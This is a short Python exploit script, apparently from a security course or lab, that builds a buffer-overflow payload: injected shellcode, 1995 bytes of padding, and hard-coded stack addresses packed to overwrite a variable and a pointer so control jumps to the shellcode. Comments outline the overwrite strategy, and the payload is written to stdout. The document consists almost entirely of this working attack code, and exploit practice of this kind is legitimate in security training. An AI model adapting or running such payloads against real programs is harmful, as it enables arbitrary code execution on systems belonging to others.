from shellcode import shellcode
import struct
import sys

#padding
payload = b'\a'*1995
#shellcode
payload2 = shellcode 
#address where shellcode starts
payload3 = struct.pack("<I", 0xbffea198)
#return address
payload4 = struct.pack("<I", 0xbffea9ac)
#basic idea: inject shellcode, then add padding, then overwrite variable "a"
#with address of shellcode, then overwrite pointer address with RA
#so the pointer will point to the RA which will then go to the address of the shellcode
value = shellcode+payload+payload3+payload4
sys.stdout.buffer.write(value)
sys.stdout.buffer.write(payload3)
